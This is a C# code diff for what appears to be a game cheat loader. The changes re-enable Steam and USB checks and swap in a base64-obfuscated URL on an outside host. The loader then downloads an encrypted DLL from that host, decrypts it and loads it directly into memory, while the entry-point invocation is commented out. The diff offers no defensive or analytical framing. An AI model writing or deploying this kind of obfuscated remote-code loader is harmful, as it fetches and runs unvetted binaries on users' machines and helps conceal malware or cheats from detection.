@@ -32,9 +32,9 @@ namespace SecuritySpace
             {
                 DeleteLoader();
             }
-            //CheckSteam();
-            //CheckUSB();
-            LoadCheat(/*http://zurrapa.host/testing.dll*/"aHR0cDovL3p1cnJhcGEuaG9zdC90ZXN0aW5nLmRsbA");
+            CheckSteam();
+            CheckUSB();
+            LoadCheat(/*http://zurrapa.host/zurr*/"aHR0cDovL3p1cnJhcGEuaG9zdC96dXJy");
         }
         #endregion
 
@@ -76,16 +76,14 @@ namespace SecuritySpace
             try
             {
                 using (WebClient web = new WebClient())
-                {
+                {                
                     DynamicDllLoader loader = new DynamicDllLoader();
-                    byte[] dll = web.DownloadData(Crypt.Decode(base64URL));
+                    loader.LoadLibrary(Crypt.Decrypt(web.DownloadData(Crypt.Decode(base64URL))));
+                    //loader.LoadLibrary(web.DownloadData(Crypt.Decode(base64URL)));
 
-                    //loader.LoadLibrary(Crypt.Decrypt(web.DownloadData(Crypt.Decode(base64URL))));
-                    loader.LoadLibrary(dll);
+                    //Zurrapa main = (Zurrapa)Marshal.GetDelegateForFunctionPointer( (IntPtr)loader.GetProcAddress( Crypt.Decode( /*Zurrapa*/"WnVycmFwYQ") ), typeof(Zurrapa));
 
-                    Zurrapa main = (Zurrapa)Marshal.GetDelegateForFunctionPointer( (IntPtr)loader.GetProcAddress( Crypt.Decode( /*Zurrapa*/"WnVycmFwYQ") ), typeof(Zurrapa));
-
-                    main();
+                    //main();
                 }
             }
             catch
